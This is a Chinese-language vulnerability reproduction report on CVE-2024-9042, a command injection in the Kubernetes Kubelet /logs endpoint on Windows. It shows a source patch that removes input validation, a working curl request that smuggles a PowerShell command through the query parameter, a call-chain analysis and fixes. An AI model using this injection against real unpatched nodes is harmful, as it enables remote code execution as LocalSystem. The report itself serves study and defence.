# Kubelet Windows RCE (CVE-2024-9042) 真实环境复现报告

## 1. 漏洞概述

**CVE-2024-9042** 是 Kubernetes Kubelet 组件在 Windows 节点上的一个命令注入漏洞。该漏洞允许攻击者通过 `NodeLogQuery` 功能（即 `/logs` API 接口）执行任意 PowerShell 命令。

漏洞的核心位置在 `pkg/kubelet/kubelet_server_journal_windows.go` 中的 `checkForNativeLogger` 函数。该函数通过 PowerShell 执行 `Get-WinEvent` 命令时，直接将用户输入的 `service` 参数拼接到命令字符串中，没有进行足够的验证和转义。

## 2. 复现环境

*   **操作系统**: Windows 10/11 或 Windows Server
*   **Kubernetes 源码**: `k8s.io/kubernetes` (用于编译漏洞版本)
*   **Go 版本**: Go 1.23+
*   **工具**: PowerShell, curl

## 3. 复现步骤

### 3.1 准备存在漏洞的 Kubelet

由于官方最新发布版本（如 v1.32.0）已在 API 层面对 `service` 参数进行了输入验证（`safeServiceName`），我们需要修改源代码以模拟存在漏洞的环境（或使用已知的受影响旧版本）。

1.  **修改源代码以暴露漏洞**:
    打开 `pkg/kubelet/kubelet_server_journal.go`，注释掉 `safeServiceName` 验证：

    ```go
    func validateServices(services []string) field.ErrorList {
        allErrs := field.ErrorList{}
        for _, s := range services {
            // [PoC] 禁用验证以复现漏洞
            // if err := safeServiceName(s); err != nil {
            //     allErrs = append(allErrs, field.Invalid(field.NewPath("query"), s, err.Error()))
            // }
            _ = s
        }
        // ...
    }
    ```

    或者确保 `checkForNativeLogger` 函数直接被调用且绕过验证。

2.  **编译 Kubelet**:
    ```powershell
    cd C:\Work\kubernetes
    $env:CGO_ENABLED="0"
    go build -mod=mod -o kubelet.exe ./cmd/kubelet
    ```

### 3.2 启动 Kubelet

以 **管理员权限** 启动 Kubelet（独立模式，无需完整的 Container Runtime）：

```powershell
.\kubelet.exe --config .\kubelet-config.yaml --hostname-override=127.0.0.1
```

等待 Kubelet 启动并监听 `10250` 端口。

### 3.3 发送攻击 Payload

打开另一个 PowerShell 窗口，发送包含命令注入 payload 的 HTTP 请求。

**Payload 分析**:
我们通过由分号 `;` 分隔的 PowerShell 命令进行注入。
`foo; New-Item RCE_HTTP.txt -Force`

**执行命令**:
```powershell
# URL 编码: ; -> %3B, 空格 -> %20
curl.exe -k "https://127.0.0.1:10250/logs/?query=foo%3B%20New-Item%20RCE_HTTP.txt%20-Force"
```

该请求将被解析并传递给 `checkForNativeLogger`，最终在 PowerShell 中执行类似以下的命令：
```powershell
Get-WinEvent -ListProvider foo; New-Item RCE_HTTP.txt -Force | Format-Table -AutoSize
```

### 3.4 验证 RCE 成功

由于 Kubelet 服务通常以 **LocalSystem** 或 **管理员** 身份运行，注入的命令将在其工作目录下执行。在我们的复现环境中，文件被创建在 `C:\Windows\System32\` 目录下（Kubelet 的默认工作目录）。

运行以下命令检查文件是否被创建：

```powershell
Test-Path C:\Windows\System32\RCE_HTTP.txt
```

如果返回 `True`，则说明 RCE 复现成功。

## 4. 漏洞原理分析

调用链：
1. `ServeHTTP` 接收 `/logs` 请求。
2. 调用 `splitNativeVsFileLoggers` 分离原生日志服务和文件日志服务。
3. 调用 **`checkForNativeLogger(ctx, service)`** 检查服务是否支持原生日志。
4. `checkForNativeLogger` 使用 `fmt.Sprintf` 构造命令：
   ```go
   cmd := exec.CommandContext(ctx, "PowerShell.exe", []string{
       "-Command",
       fmt.Sprintf("Get-WinEvent -ListProvider %s | ...", service)}...)
   ```
5. 恶意 `service` 参数（如 `foo; cmdlet`）闭合了前面的命令并开启了新的命令，导致任意代码执行。

## 5. 修复建议

1.  **升级 Kubernetes**: 升级到官方修复版本（v1.32.1+, v1.31.5+, v1.30.9+, v1.29.13+）。
2.  **严格的输入验证**: 确保 `safeServiceName` 验证在所有代码路径中都被强制执行，特别是在传递给 shell 执行之前。
3.  **避免 Shell 执行**: 尽可能使用 Go 原生 API 或不通过 shell (`-Command`) 直接执行命令。
